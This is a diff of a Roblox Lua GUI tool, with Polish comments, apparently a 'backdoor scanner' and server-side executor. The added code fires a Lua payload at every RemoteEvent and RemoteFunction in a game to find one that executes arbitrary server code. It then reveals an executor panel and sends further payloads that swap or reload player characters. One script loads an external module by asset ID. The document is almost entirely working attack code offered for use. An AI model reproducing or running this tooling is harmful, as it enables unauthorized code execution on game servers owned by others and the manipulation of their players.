@@ -158,7 +158,6 @@ Exec.BorderSizePixel = 0
 Exec.Position = UDim2.new(0.238866404, 0, 0.237012982, 0)
 Exec.Selectable = true
 Exec.Size = UDim2.new(0, 515, 0, 323)
-Exec.Visible = false
 
 UICorner_3.CornerRadius = UDim.new(0, 15)
 UICorner_3.Parent = Exec
@@ -825,10 +824,11 @@ LLine.ZIndex = 50
 
 -- Scripts:
 
-local function QWDVM_fake_script() -- Scan.LocalScript 
+local function OQIVF_fake_script() -- Scan.LocalScript 
 	local script = Instance.new('LocalScript', Scan)
 
 	local button = script.Parent
+	local remoteTimeout = 2.5 -- <<<<<<<<<<<< Tutaj wpisz ile sekund czekać na każdy RemoteEvent/RemoteFunction!
 	local TweenService = game:GetService("TweenService")
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local exec = script.Parent.Parent.Parent.Exec
@@ -840,7 +840,6 @@ local function QWDVM_fake_script() -- Scan.LocalScript
 	button.ClipsDescendants = true
 	
 	local isAcquiring = false
-	local AcquiredRemote = nil
 	
 	-- Ripple effect for button click
 	local function createRipple()
@@ -870,102 +869,99 @@ local function QWDVM_fake_script() -- Scan.LocalScript
 		end)
 	end
 	
+	local function randomModelName(len)
+		local name = ""
+		for i = 1, len do
+			name = name .. string.char(math.random(65, 90))
+		end
+		return name
+	end
+	
+	local function sendPayload(remote, modelName)
+		local code = 'Instance.new("Model",workspace).Name="'..modelName..'"'
+		if remote:IsA("RemoteEvent") then
+			remote:FireServer(code)
+		elseif remote:IsA("RemoteFunction") then
+			task.spawn(function() remote:InvokeServer(code) end)
+		end
+	end
+	
+	local function notifySuccess(time, checked)
+		exec.Visible = true
+		scanner.Visible = false
+		StarterGui:SetCore("SendNotification", {
+			Title = "Backdoor found!",
+			Text = "Time: "..time.."s\nChecked: "..checked.." remotes",
+			Icon = "rbxassetid://109509735989414",
+			Duration = 5
+		})
+	end
+	
+	local function notifyFail(checked)
+		StarterGui:SetCore("SendNotification", {
+			Title = "No backdoors :(",
+			Text = "Checked: "..checked.." remotes\nNo working backdoors found",
+			Duration = 4
+		})
+	end
+	
+	local function scanRemotes(remotes, timeout)
+		local checkedTotal = 0
+		local acquiredRemote = nil
+		for _, obj in ipairs(remotes) do
+			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+				checkedTotal = checkedTotal + 1
+				local modelName = randomModelName(32)
+				sendPayload(obj, modelName)
+				local t1 = tick()
+				repeat task.wait(0.02) until workspace:FindFirstChild(modelName) or tick() - t1 > timeout
+				if workspace:FindFirstChild(modelName) then
+					acquiredRemote = obj
+					break
+				end
+			end
+		end
+		return acquiredRemote, checkedTotal
+	end
+	
 	button.MouseButton1Click:Connect(function()
 		createRipple()
+		if isAcquiring then return end
+		isAcquiring = true
+	
 		local startTime = tick()
-		local RemoteList = {}
-		local CurrentRemote = nil
-		local isFound = false
+		local checkedTotal = 0
+		local acquiredRemote = nil
 	
-		if not isAcquiring then
-			isAcquiring = true
+		-- 1. ReplicatedStorage:GetChildren() – szybkie, bezpośrednie dzieci
+		acquiredRemote, checkedTotal = scanRemotes(ReplicatedStorage:GetChildren(), remoteTimeout)
 	
-			-- 1) First: collect remotes from ReplicatedStorage (priority)
-			-- 2) Then: collect remotes from the whole game (excluding those already collected)
-			-- This preserves original logic but tries likely candidates first.
-	
-			local seen = {} -- dedupe set
-	
-			-- Collect from ReplicatedStorage first
-			for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-				if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not seen[obj] then
-					table.insert(RemoteList, obj)
-					seen[obj] = true
-				end
-			end
-	
-			-- Then collect from the whole game, skip ones already seen
-			for _, obj in ipairs(game:GetDescendants()) do
-				if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not seen[obj] then
-					table.insert(RemoteList, obj)
-					seen[obj] = true
-				end
-			end
-	
-			-- Now test each remote in RemoteList in order (ReplicatedStorage ones first)
-			for _, b in ipairs(RemoteList) do
-				if AcquiredRemote == nil then
-					-- generate random model name (kept same style as original)
-					local NeededNameOfModel = string.char(
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
-						math.random(0x0041,0x005A),math.random(0x0041,0x005A)
-					)
-	
-					local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel..'"'
-					CurrentRemote = b
-	
-					-- Keep original behavior: send code regardless of remote's parent
-					if b:IsA("RemoteEvent") then
-						b:FireServer(NeededCode)
-					elseif b:IsA("RemoteFunction") then
-						task.spawn(function() b:InvokeServer(NeededCode) end)
-					end
-	
-					task.wait(2.5)
-	
-					local created = workspace:FindFirstChild(NeededNameOfModel)
-					if created and created:IsA("Model") then
-						AcquiredRemote = b
-					end
-				end
-			end
-	
-			local elapsed = string.format("%.3f", tick() - startTime)
-	
-			if AcquiredRemote ~= nil then
-				isFound = true
-				exec.Visible = true
-				scanner.Visible = false
-				StarterGui:SetCore("SendNotification", {
-					Title = "Backdoor found!",
-					Text = "Time to find backdoor: "..elapsed.." seconds",
-					Icon = "rbxassetid://109509735989414",
-					Duration = 5
-				})
-			else
-				isFound = false
-				StarterGui:SetCore("SendNotification", {
-					Title = "No backdoors :(",
-					Text = "There are no working backdoors in the game",
-					Duration = 4
-				})
-			end
-	
-			isAcquiring = false
+		-- 2. Jeśli nie znaleziono, ReplicatedStorage:GetDescendants() – wszystkie potomki
+		if not acquiredRemote then
+			local found, checked = scanRemotes(ReplicatedStorage:GetDescendants(), remoteTimeout)
+			checkedTotal = checkedTotal + checked
+			acquiredRemote = found
 		end
-	end)
 	
+		-- 3. Jeśli nie znaleziono, cała gra (GetDescendants)
+		if not acquiredRemote then
+			local found, checked = scanRemotes(game:GetDescendants(), remoteTimeout)
+			checkedTotal = checkedTotal + checked
+			acquiredRemote = found
+		end
+	
+		local elapsed = string.format("%.2f", tick() - startTime)
+		if acquiredRemote then
+			notifySuccess(elapsed, checkedTotal)
+		else
+			notifyFail(checkedTotal)
+		end
+	
+		isAcquiring = false
+	end)
 end
-coroutine.wrap(QWDVM_fake_script)()
-local function NXTQEN_fake_script() -- Scanner.LocalScript 
+coroutine.wrap(OQIVF_fake_script)()
+local function MAANGZ_fake_script() -- Scanner.LocalScript 
 	local script = Instance.new('LocalScript', Scanner)
 
 	function dragify(Main)
@@ -1015,9 +1011,9 @@ local function NXTQEN_fake_script() -- Scanner.LocalScript
 	
 	dragify(script.Parent)
 end
-coroutine.wrap(NXTQEN_fake_script)()
+coroutine.wrap(MAANGZ_fake_script)()
 -- Exec.Highlighter is disabled.
-local function NYJOUPU_fake_script() -- Exec.LocalScript 
+local function ODFIZY_fake_script() -- Exec.LocalScript 
 	local script = Instance.new('LocalScript', Exec)
 
 	function dragify(Main)
@@ -1067,8 +1063,8 @@ local function NYJOUPU_fake_script() -- Exec.LocalScript
 	
 	dragify(script.Parent)
 end
-coroutine.wrap(NYJOUPU_fake_script)()
-local function VDNRL_fake_script() -- Execute.LocalScript 
+coroutine.wrap(ODFIZY_fake_script)()
+local function SSOPUO_fake_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	local button = script.Parent
@@ -1142,8 +1138,8 @@ local function VDNRL_fake_script() -- Execute.LocalScript
 		DeepFire(game)
 	end)
 end
-coroutine.wrap(VDNRL_fake_script)()
-local function JWXWEUG_fake_script() -- Clear.LocalScript 
+coroutine.wrap(SSOPUO_fake_script)()
+local function VNIZYV_fake_script() -- Clear.LocalScript 
 	local script = Instance.new('LocalScript', Clear)
 
 	local button = script.Parent
@@ -1190,8 +1186,8 @@ local function JWXWEUG_fake_script() -- Clear.LocalScript
 		end
 	end)
 end
-coroutine.wrap(JWXWEUG_fake_script)()
-local function PPNCOY_fake_script() -- R6.LocalScript 
+coroutine.wrap(VNIZYV_fake_script)()
+local function LLPLRQN_fake_script() -- R6.LocalScript 
 	local script = Instance.new('LocalScript', R6)
 
 	local button = script.Parent
@@ -1231,24 +1227,41 @@ local function PPNCOY_fake_script() -- R6.LocalScript
 	end)
 	
 end
-coroutine.wrap(PPNCOY_fake_script)()
-local function VTAO_fake_script() -- R6.Script 
+coroutine.wrap(LLPLRQN_fake_script)()
+local function DGOGXNH_fake_script() -- R6.Script 
 	local script = Instance.new('Script', R6)
 
-	script.Parent.MouseButton1Down:Connect(function(x: number, y: number) 
+	local button = script.Parent
+	local acquiredRemote = nil -- tutaj zapisz referencję do wykrytego backdoora!
+	
+	local function getMorphPayload(plr)
+		return ([[
+	        local plr = game.Players:FindFirstChild("%s")
+	        if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+	            local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
+	            local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
+	            morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
+	            morph.Name = plr.Name
+	            plr.Character = morph
+	            morph.Parent = workspace
+	        end
+	    ]]):format(plr.Name)
+	end
+	
+	button.MouseButton1Down:Connect(function(x, y)
 		local plr = script.Parent.Parent.Parent.Parent.Parent
-		if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-			local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
-			local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
-			morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
-			morph.Name = plr.Name
-			plr.Character = morph
-			morph.Parent = workspace    
+		if acquiredRemote then
+			local payload = getMorphPayload(plr)
+			if acquiredRemote:IsA("RemoteEvent") then
+				acquiredRemote:FireServer(payload)
+			elseif acquiredRemote:IsA("RemoteFunction") then
+				acquiredRemote:InvokeServer(payload)
+			end
 		end
 	end)
 end
-coroutine.wrap(VTAO_fake_script)()
-local function VOEF_fake_script() -- Reset.LocalScript 
+coroutine.wrap(DGOGXNH_fake_script)()
+local function MLLKHT_fake_script() -- Reset.LocalScript 
 	local script = Instance.new('LocalScript', Reset)
 
 	local button = script.Parent
@@ -1288,16 +1301,36 @@ local function VOEF_fake_script() -- Reset.LocalScript
 	end)
 	
 end
-coroutine.wrap(VOEF_fake_script)()
-local function AHKT_fake_script() -- Reset.Script 
+coroutine.wrap(MLLKHT_fake_script)()
+local function XQEOA_fake_script() -- Reset.Script 
 	local script = Instance.new('Script', Reset)
 
-	script.Parent.MouseButton1Down:Connect(function(x: number, y: number) 
-		script.Parent.Parent.Parent.Parent.Parent:LoadCharacter()
+	local button = script.Parent
+	local acquiredRemote = nil -- tutaj przypisz referencję do wykrytego backdoora!
+	
+	local function getR15Payload(plr)
+		return ([[
+	        local plr = game.Players:FindFirstChild("%s")
+	        if plr then
+	            plr:LoadCharacter()
+	        end
+	    ]]):format(plr.Name)
+	end
+	
+	button.MouseButton1Down:Connect(function(x, y)
+		local plr = script.Parent.Parent.Parent.Parent.Parent
+		if acquiredRemote then
+			local payload = getR15Payload(plr)
+			if acquiredRemote:IsA("RemoteEvent") then
+				acquiredRemote:FireServer(payload)
+			elseif acquiredRemote:IsA("RemoteFunction") then
+				acquiredRemote:InvokeServer(payload)
+			end
+		end
 	end)
 end
-coroutine.wrap(AHKT_fake_script)()
-local function EBSQKS_fake_script() -- ScriptHuB.LocalScript 
+coroutine.wrap(XQEOA_fake_script)()
+local function RPFDGSU_fake_script() -- ScriptHuB.LocalScript 
 	local script = Instance.new('LocalScript', ScriptHuB)
 
 	local button = script.Parent
@@ -1349,8 +1382,8 @@ local function EBSQKS_fake_script() -- ScriptHuB.LocalScript
 		end	
 	end)
 end
-coroutine.wrap(EBSQKS_fake_script)()
-local function TRJOCX_fake_script() -- Polaria.LocalScript 
+coroutine.wrap(RPFDGSU_fake_script)()
+local function DSMJ_fake_script() -- Polaria.LocalScript 
 	local script = Instance.new('LocalScript', Polaria)
 
 	local button = script.Parent
@@ -1390,24 +1423,24 @@ local function TRJOCX_fake_script() -- Polaria.LocalScript
 	end)
 	
 end
-coroutine.wrap(TRJOCX_fake_script)()
-local function HCMCKVB_fake_script() -- Polaria.Script 
+coroutine.wrap(DSMJ_fake_script)()
+local function KWJU_fake_script() -- Polaria.Script 
 	local script = Instance.new('Script', Polaria)
 
 	script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
 		require(121550031249356).Load(plr.Name)
 	end)
 end
-coroutine.wrap(HCMCKVB_fake_script)()
-local function XYQLV_fake_script() -- Polaria.LocalScript 
+coroutine.wrap(KWJU_fake_script)()
+local function SHITK_fake_script() -- Polaria.LocalScript 
 	local script = Instance.new('LocalScript', Polaria)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.RemoteEvent:FireServer()
 	end)
 end
-coroutine.wrap(XYQLV_fake_script)()
-local function RPMTHX_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(SHITK_fake_script)()
+local function CEAENZV_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	local button = script.Parent
@@ -1447,8 +1480,8 @@ local function RPMTHX_fake_script() -- TextButton.LocalScript
 	end)
 	
 end
-coroutine.wrap(RPMTHX_fake_script)()
-local function OHMMBOR_fake_script() -- TextButton_2.LocalScript 
+coroutine.wrap(CEAENZV_fake_script)()
+local function NPNGQI_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	local button = script.Parent
@@ -1488,8 +1521,8 @@ local function OHMMBOR_fake_script() -- TextButton_2.LocalScript
 	end)
 	
 end
-coroutine.wrap(OHMMBOR_fake_script)()
-local function PKMSU_fake_script() -- TextButton_3.LocalScript 
+coroutine.wrap(NPNGQI_fake_script)()
+local function QEPI_fake_script() -- TextButton_3.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_3)
 
 	local button = script.Parent
@@ -1529,8 +1562,8 @@ local function PKMSU_fake_script() -- TextButton_3.LocalScript
 	end)
 	
 end
-coroutine.wrap(PKMSU_fake_script)()
-local function IRSZC_fake_script() -- TextButton_4.LocalScript 
+coroutine.wrap(QEPI_fake_script)()
+local function AHRTGDK_fake_script() -- TextButton_4.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_4)
 
 	local button = script.Parent
@@ -1570,8 +1603,8 @@ local function IRSZC_fake_script() -- TextButton_4.LocalScript
 	end)
 	
 end
-coroutine.wrap(IRSZC_fake_script)()
-local function OJOGTP_fake_script() -- TextButton_5.LocalScript 
+coroutine.wrap(AHRTGDK_fake_script)()
+local function CWESIAS_fake_script() -- TextButton_5.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_5)
 
 	local button = script.Parent
@@ -1611,8 +1644,8 @@ local function OJOGTP_fake_script() -- TextButton_5.LocalScript
 	end)
 	
 end
-coroutine.wrap(OJOGTP_fake_script)()
-local function PYALXL_fake_script() -- TextButton_6.LocalScript 
+coroutine.wrap(CWESIAS_fake_script)()
+local function HZTEHQ_fake_script() -- TextButton_6.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_6)
 
 	local button = script.Parent
@@ -1652,8 +1685,8 @@ local function PYALXL_fake_script() -- TextButton_6.LocalScript
 	end)
 	
 end
-coroutine.wrap(PYALXL_fake_script)()
-local function BRDH_fake_script() -- TextButton_7.LocalScript 
+coroutine.wrap(HZTEHQ_fake_script)()
+local function AXMXYU_fake_script() -- TextButton_7.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_7)
 
 	local button = script.Parent
@@ -1693,8 +1726,8 @@ local function BRDH_fake_script() -- TextButton_7.LocalScript
 	end)
 	
 end
-coroutine.wrap(BRDH_fake_script)()
-local function GIXSGWU_fake_script() -- TextButton_8.LocalScript 
+coroutine.wrap(AXMXYU_fake_script)()
+local function EIGCRX_fake_script() -- TextButton_8.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_8)
 
 	local button = script.Parent
@@ -1734,8 +1767,8 @@ local function GIXSGWU_fake_script() -- TextButton_8.LocalScript
 	end)
 	
 end
-coroutine.wrap(GIXSGWU_fake_script)()
-local function TNJP_fake_script() -- TextButton_9.LocalScript 
+coroutine.wrap(EIGCRX_fake_script)()
+local function JFBK_fake_script() -- TextButton_9.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_9)
 
 	local button = script.Parent
@@ -1775,8 +1808,8 @@ local function TNJP_fake_script() -- TextButton_9.LocalScript
 	end)
 	
 end
-coroutine.wrap(TNJP_fake_script)()
-local function JDSFLBI_fake_script() -- TextButton_10.LocalScript 
+coroutine.wrap(JFBK_fake_script)()
+local function FKGYLVL_fake_script() -- TextButton_10.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_10)
 
 	local button = script.Parent
@@ -1816,8 +1849,8 @@ local function JDSFLBI_fake_script() -- TextButton_10.LocalScript
 	end)
 	
 end
-coroutine.wrap(JDSFLBI_fake_script)()
-local function NGLG_fake_script() -- TextButton_11.LocalScript 
+coroutine.wrap(FKGYLVL_fake_script)()
+local function QWXZCGW_fake_script() -- TextButton_11.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_11)
 
 	local button = script.Parent
@@ -1857,8 +1890,8 @@ local function NGLG_fake_script() -- TextButton_11.LocalScript
 	end)
 	
 end
-coroutine.wrap(NGLG_fake_script)()
-local function HAQVUFH_fake_script() -- TextButton_12.LocalScript 
+coroutine.wrap(QWXZCGW_fake_script)()
+local function PSRNWPV_fake_script() -- TextButton_12.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_12)
 
 	local button = script.Parent
@@ -1898,8 +1931,8 @@ local function HAQVUFH_fake_script() -- TextButton_12.LocalScript
 	end)
 	
 end
-coroutine.wrap(HAQVUFH_fake_script)()
-local function POAVGI_fake_script() -- TextButton_13.LocalScript 
+coroutine.wrap(PSRNWPV_fake_script)()
+local function ZCPTGIM_fake_script() -- TextButton_13.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_13)
 
 	local button = script.Parent
@@ -1939,8 +1972,8 @@ local function POAVGI_fake_script() -- TextButton_13.LocalScript
 	end)
 	
 end
-coroutine.wrap(POAVGI_fake_script)()
-local function XXMZZ_fake_script() -- TextButton_14.LocalScript 
+coroutine.wrap(ZCPTGIM_fake_script)()
+local function RXERY_fake_script() -- TextButton_14.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_14)
 
 	local button = script.Parent
@@ -1980,8 +2013,8 @@ local function XXMZZ_fake_script() -- TextButton_14.LocalScript
 	end)
 	
 end
-coroutine.wrap(XXMZZ_fake_script)()
-local function OQXJ_fake_script() -- TextButton_15.LocalScript 
+coroutine.wrap(RXERY_fake_script)()
+local function KFNAULF_fake_script() -- TextButton_15.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_15)
 
 	local button = script.Parent
@@ -2021,8 +2054,8 @@ local function OQXJ_fake_script() -- TextButton_15.LocalScript
 	end)
 	
 end
-coroutine.wrap(OQXJ_fake_script)()
-local function QRAT_fake_script() -- TextButton_16.LocalScript 
+coroutine.wrap(KFNAULF_fake_script)()
+local function BULXGX_fake_script() -- TextButton_16.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_16)
 
 	local button = script.Parent
@@ -2062,8 +2095,8 @@ local function QRAT_fake_script() -- TextButton_16.LocalScript
 	end)
 	
 end
-coroutine.wrap(QRAT_fake_script)()
-local function BPTGPET_fake_script() -- TextButton_17.LocalScript 
+coroutine.wrap(BULXGX_fake_script)()
+local function CUOSE_fake_script() -- TextButton_17.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_17)
 
 	local button = script.Parent
@@ -2103,8 +2136,8 @@ local function BPTGPET_fake_script() -- TextButton_17.LocalScript
 	end)
 	
 end
-coroutine.wrap(BPTGPET_fake_script)()
-local function PQDWWSM_fake_script() -- TextButton_18.LocalScript 
+coroutine.wrap(CUOSE_fake_script)()
+local function LPIION_fake_script() -- TextButton_18.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_18)
 
 	local button = script.Parent
@@ -2144,8 +2177,8 @@ local function PQDWWSM_fake_script() -- TextButton_18.LocalScript
 	end)
 	
 end
-coroutine.wrap(PQDWWSM_fake_script)()
-local function JDYFVA_fake_script() -- TextButton_19.LocalScript 
+coroutine.wrap(LPIION_fake_script)()
+local function ILLAYC_fake_script() -- TextButton_19.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_19)
 
 	local button = script.Parent
@@ -2185,8 +2218,8 @@ local function JDYFVA_fake_script() -- TextButton_19.LocalScript
 	end)
 	
 end
-coroutine.wrap(JDYFVA_fake_script)()
-local function LZXKORD_fake_script() -- TextButton_20.LocalScript 
+coroutine.wrap(ILLAYC_fake_script)()
+local function XWKET_fake_script() -- TextButton_20.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_20)
 
 	local button = script.Parent
@@ -2226,8 +2259,8 @@ local function LZXKORD_fake_script() -- TextButton_20.LocalScript
 	end)
 	
 end
-coroutine.wrap(LZXKORD_fake_script)()
-local function ZSLOCH_fake_script() -- TextButton_21.LocalScript 
+coroutine.wrap(XWKET_fake_script)()
+local function VEIR_fake_script() -- TextButton_21.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_21)
 
 	local button = script.Parent
@@ -2267,8 +2300,8 @@ local function ZSLOCH_fake_script() -- TextButton_21.LocalScript
 	end)
 	
 end
-coroutine.wrap(ZSLOCH_fake_script)()
-local function IQUVL_fake_script() -- TextButton_22.LocalScript 
+coroutine.wrap(VEIR_fake_script)()
+local function PMAGN_fake_script() -- TextButton_22.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_22)
 
 	local button = script.Parent
@@ -2308,8 +2341,8 @@ local function IQUVL_fake_script() -- TextButton_22.LocalScript
 	end)
 	
 end
-coroutine.wrap(IQUVL_fake_script)()
-local function VWGTT_fake_script() -- TextButton_23.LocalScript 
+coroutine.wrap(PMAGN_fake_script)()
+local function PDWRZ_fake_script() -- TextButton_23.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_23)
 
 	local button = script.Parent
@@ -2349,8 +2382,8 @@ local function VWGTT_fake_script() -- TextButton_23.LocalScript
 	end)
 	
 end
-coroutine.wrap(VWGTT_fake_script)()
-local function XAEPK_fake_script() -- TextButton_24.LocalScript 
+coroutine.wrap(PDWRZ_fake_script)()
+local function WKZZCS_fake_script() -- TextButton_24.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_24)
 
 	local button = script.Parent
@@ -2390,8 +2423,8 @@ local function XAEPK_fake_script() -- TextButton_24.LocalScript
 	end)
 	
 end
-coroutine.wrap(XAEPK_fake_script)()
-local function AWRBJQO_fake_script() -- Scroll.Editor 
+coroutine.wrap(WKZZCS_fake_script)()
+local function GGXTNO_fake_script() -- Scroll.Editor 
 	local script = Instance.new('LocalScript', Scroll)
 
 	-- Super-rozbudowany edytor Lua do Roblox Studio
@@ -2622,4 +2655,4 @@ local function AWRBJQO_fake_script() -- Scroll.Editor
 		end
 	end)
 end
-coroutine.wrap(AWRBJQO_fake_script)()
+coroutine.wrap(GGXTNO_fake_script)()
